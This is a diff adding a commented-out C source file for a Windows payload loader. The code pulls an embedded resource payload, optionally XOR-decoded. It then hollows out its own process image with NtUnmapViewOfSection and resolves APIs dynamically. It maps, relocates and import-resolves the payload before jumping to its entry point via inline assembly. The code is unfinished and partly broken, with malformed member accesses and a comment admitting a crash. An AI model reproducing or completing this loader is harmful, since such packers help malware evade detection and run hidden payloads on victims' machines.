@@ -1,0 +1,235 @@
+/*static DWORD process_import_address_table(DWORD base_address, PIMAGE_NT_HEADERS nt_headers) {
+	PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
+	PIMAGE_THUNK_DATA thunk_data_lookup, thunk_data_iat;
+	LPCSTR dll_name;
+	HMODULE module_handle;
+
+	printf("Resolving IAT for newly relocated loader\n");
+	while (1) {
+		import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(base_address + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+		while (import_descriptor->Name) {
+			dll_name = (PVOID)((DWORD)base_address + import_descriptor->Name);
+			printf("loading %s\n", dll_name);
+			module_handle = LoadLibraryA(dll_name);
+			if (NULL == module_handle) {
+				printf("Could not load library %s: %d\n", dll_name, GetLastError());
+				return -1;
+			}
+			thunk_data_iat = (PIMAGE_THUNK_DATA)(base_address + import_descriptor->FirstThunk);
+			thunk_data_lookup = (PIMAGE_THUNK_DATA)(base_address + import_descriptor->OriginalFirstThunk);
+
+			while (0 != thunk_data_lookup->u1.AddressOfData) {
+				PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((DWORD)base_address + thunk_data_lookup->u1.AddressOfData);
+				thunk_data_iat->u1.Function = (DWORD)GetProcAddress(module_handle, import_by_name->Name);
+				if (0 == thunk_data_iat->u1.Function) {
+					printf("Failed to resolve address for import %s\n", import_by_name->Name);
+					return -1;
+				}
+				thunk_data_lookup++;
+				thunk_data_iat++;
+			}
+			import_descriptor++;
+		}
+	}
+}*/
+
+/*static VOID loader(VOID) {
+	s_binary bin = { 0 };
+	HRSRC resource = NULL;
+	HGLOBAL resource_handle = NULL;
+
+	//bin = VirtualAlloc(NULL, sizeof(*bin), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	/*HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDD_PAYLOAD_DATA), RT_RCDATA);
+	if (NULL == resource) {
+		printf("could not find resource: %d\n", GetLastError());
+		exit(1);
+	}
+	bin.>buff_size = SizeofResource(NULL, resource);
+	HGLOBAL resource_handle = LoadResource(NULL, resource);
+	if (NULL == resource_handle) {
+		printf("Could not open resource payload: %d\n", GetLastError());
+		exit(1);
+	}
+
+	bin.>buffer = (PBYTE)LockResource(resource_handle);
+	if (NULL == bin.>buffer) {
+		printf("Could not lock resource: %d\n", GetLastError());
+		exit(1);
+	}
+
+	resource = FindResource(NULL, MAKEINTRESOURCE(IDD_PAYLOAD_KEY), RT_RCDATA);
+	if (NULL == resource) {
+		printf("Could not find resource: %d\n", GetLastError());
+		exit(1);
+	}
+	resource_handle = LoadResource(NULL, resource);
+	if (NULL == resource_handle) {
+		printf("Could not open resource key: %d\n", GetLastError());
+		exit(1);
+	}
+	bin.>key = (BYTE)LockResource(resource_handle);
+
+	// "Decrypt" payload
+	for (size_t i = 0; i <= bin.>buff_size; ++i) {
+		bin.>buffer[i] ^= bin.>key;
+	}
+	*/
+
+	/*resource = FindResource(NULL, L"HELLOWORLD", RT_RCDATA);
+	if (NULL == resource) {
+		//printf("could not find resource: %d\n", GetLastError());
+		//return -1;
+	}
+	resource_handle = LoadResource(NULL, resource);
+	if (NULL == resource_handle) {
+		//printf("Could not open resource payload: %d\n", GetLastError());
+		//return -1;
+	}
+
+	bin.buff_size = SizeofResource(NULL, resource);
+	if (0 == bin.buff_size) {
+		//printf("Could not get ressource size: %d\n", GetLastError());
+		//return -1;
+	}
+	bin.buffer = VirtualAlloc(NULL, bin.buff_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	if (NULL == bin.buffer) {
+		//printf("Could not allocate memory for ressource: %d\n", GetLastError());
+		//return -1;
+	}
+	//CopyMemory(bin.buffer, LockResource(resource_handle), bin.buff_size);
+	PBYTE pointer_to_resource = LockResource(resource_handle);
+	for (DWORD i = 0; i < bin.buff_size; i++) {
+		bin.buffer[i] = pointer_to_resource[i];
+	}
+
+
+	bin.dos_header = (PIMAGE_DOS_HEADER)bin.buffer;
+	if (IMAGE_DOS_SIGNATURE != bin.dos_header->e_magic) {
+		//printf("Signature missmatch on dos header, aborting\n");
+		//return -1;
+	}
+	bin.nt_headers = (PIMAGE_NT_HEADERS)(((DWORD)bin.buffer) + bin.dos_header->e_lfanew);
+	if (IMAGE_NT_SIGNATURE != bin.nt_headers->Signature) {
+		//printf("Signature missmatch on nt header, aborting\n");
+		//return -1;
+	}
+	PVOID initial_base_address = GetModuleHandle(0);
+
+	typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+	HMODULE ntdll = GetModuleHandleA("ntdll");
+	FARPROC fpNtUnmapViewOfSection = GetProcAddress(ntdll, "NtUnmapViewOfSection");
+	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
+
+	typedef PVOID(__stdcall* _virtual_alloc)(PVOID, SIZE_T, DWORD, DWORD);
+	HMODULE kernel32 = GetModuleHandle(L"kernel32");
+	FARPROC fp_virtual_alloc = GetProcAddress(kernel32, "VirtualAlloc");
+	_virtual_alloc VirtualAlloc = (_virtual_alloc)fp_virtual_alloc;
+
+	typedef HANDLE(__stdcall* _get_current_process)(VOID);
+	FARPROC fp_get_current_process = GetProcAddress(kernel32, "GetCurrentProcess");
+	_get_current_process GetCurrentProcess = (_get_current_process)fp_get_current_process;
+
+	typedef BOOL(__stdcall* _write_process_memory)(HANDLE, PVOID, LPCVOID, SIZE_T, SIZE_T *);
+	FARPROC fp_write_process_memory = GetProcAddress(kernel32, "WriteProcessMemory");
+	_write_process_memory WriteProcessMemory = (_write_process_memory)fp_write_process_memory;
+
+	typedef HMODULE(__stdcall* _load_library_a)(LPCSTR lpLibFileName);
+	FARPROC fp_load_library_a = GetProcAddress(kernel32, "LoadLibraryA");
+	_load_library_a LoadLibraryA = (_load_library_a)fp_load_library_a;
+
+	typedef FARPROC(__stdcall* _get_proc_address)(HMODULE hModule, LPCSTR lpProcName);
+	FARPROC fp_get_proc_address = GetProcAddress(kernel32, "GetProcAddress");
+	_get_proc_address GetProcAddress = (_get_proc_address)fp_get_proc_address;
+	// Hollow out the cradle using NtUnmapViewofSection
+	//__asm {INT 3}
+	if (0 == NtUnmapViewOfSection(GetCurrentProcess(), initial_base_address)) {
+		// We start by reallocating memory in order to make sure that our code fits the process
+		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)bin.buffer;
+		PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((PBYTE)bin.buffer + dos_header->e_lfanew);
+		PVOID new_base_address = VirtualAlloc(NULL, nt_header->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (NULL != new_base_address) {
+			//printf("allocated 0x%08X bytes for new process, base address will be 0x%08X\n", nt_header->OptionalHeader.SizeOfImage, (DWORD)new_base_address);
+			// Write new headers, then write sections
+			DWORD bytes_written;
+			if (TRUE == WriteProcessMemory(GetCurrentProcess(), new_base_address, bin.buffer, nt_header->OptionalHeader.SizeOfHeaders, &bytes_written)) {
+				//printf("Wriiten 0x%08X bytes of headers on new base address 0x%08X\n", bytes_written, (DWORD)new_base_address);
+				BOOL success = TRUE;
+				//DWORD section_start = 0;
+				PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header);
+				for (DWORD i = 0; i < nt_header->FileHeader.NumberOfSections; ++i) {
+					//printf("Writing section %s, rva 0x%08X at address 0x%08X\n", section->Name, section->VirtualAddress, (DWORD)new_base_address + section->VirtualAddress);
+					success &= WriteProcessMemory(GetCurrentProcess(), (PVOID)((DWORD)new_base_address + section->VirtualAddress), (PVOID)((DWORD)bin.buffer + section->PointerToRawData), section->SizeOfRawData, &bytes_written);
+					section++;
+				}
+				if (FALSE != success) {
+					// Now we relocate the code
+					PIMAGE_BASE_RELOCATION base_reloc_table = (PIMAGE_BASE_RELOCATION)((DWORD)new_base_address + nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+					// http://research32.blogspot.com/2015/01/base-relocation-table.html
+					// http://bytepointer.com/resources/pietrek_peering_inside_pe.htm
+					while (1) {
+						if (base_reloc_table->SizeOfBlock == 0 && base_reloc_table->VirtualAddress == 0) {
+							break;
+						}
+						DWORD number_of_entries = (base_reloc_table->SizeOfBlock - sizeof(*base_reloc_table)) / sizeof(WORD);
+						PWORD rva_to_fix = (PWORD)((DWORD)base_reloc_table + sizeof(*base_reloc_table));
+						for (DWORD i = 0; i < number_of_entries; ++i) {
+							// Now we do the fixups
+							PDWORD addr = (PDWORD)((DWORD)new_base_address + (DWORD)(base_reloc_table->VirtualAddress + (*rva_to_fix & (1 << 12) - 1)));
+							*addr -= nt_header->OptionalHeader.ImageBase - (DWORD)new_base_address;
+							rva_to_fix++;
+						}
+						(DWORD)base_reloc_table += (DWORD)base_reloc_table->SizeOfBlock;
+					}
+
+					// So far so good:
+					// 1: Resolve all functions addresses (look at the import table): https://stackoverflow.com/questions/15960437/how-to-read-import-directory-table-in-c
+					// http://www.sandsprite.com/CodeStuff/Understanding_imports.html
+					// https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-idata-section
+					// new_base_address points to the new unpacked pe
+					dos_header = (PIMAGE_DOS_HEADER)new_base_address;
+					nt_header = (PIMAGE_NT_HEADERS)(PIMAGE_NT_HEADERS)((PBYTE)new_base_address + dos_header->e_lfanew);
+					PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD)new_base_address);
+					PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)new_base_address + nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+					while ((PVOID)import_descriptor->Name != NULL) {
+						
+						PIMAGE_THUNK_DATA thunk_data_lookup = (PIMAGE_THUNK_DATA)((DWORD)new_base_address + import_descriptor->OriginalFirstThunk);
+						PIMAGE_THUNK_DATA thunk_data_iat = (PIMAGE_THUNK_DATA)((DWORD)new_base_address + import_descriptor->FirstThunk);
+						LPCSTR dll_name = (PVOID)((DWORD)new_base_address + import_descriptor->Name);
+						HMODULE module_handle = LoadLibraryA(dll_name);
+						if (NULL == module_handle) {
+							return;
+						}
+						// TODO: handle ordinal import
+						while (thunk_data_lookup->u1.AddressOfData != 0) {
+							PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((DWORD)new_base_address + thunk_data_lookup->u1.AddressOfData);
+							thunk_data_iat->u1.Function = (DWORD) GetProcAddress(module_handle, import_by_name->Name);
+							if (0 == thunk_data_iat->u1.Function) {
+								return;
+							}
+							thunk_data_lookup++;
+							thunk_data_iat++;
+						}
+						import_descriptor++;
+					}
+					
+					// jmp new_base_address + nt_header->OptionalHeader.AddressOfEntryPoint
+					// Fails on init_security_cookie. PLaces the cookie on non readeble memory
+					__asm {
+						MOV EDX, nt_header
+						MOV EAX, new_base_address
+						ADD EAX, [EDX + 028H]
+						JMP EAX
+					}
+				}
+			}
+		}
+	}
+	INSERT_DWORD(0x0BADB00B);
+}
+
+DWORD get_loader_size(PVOID loader_address, DWORD needle) {
+	DWORD i;
+	for (i = 0; *((DWORD*)(&((PBYTE)loader_address)[i])) != needle; (BYTE)i++);
+	printf("found needle: 0x%08X, size is 0x%08X\n", *((DWORD*)(&((PBYTE)loader_address)[i])), i);
+	return i;
+}*/
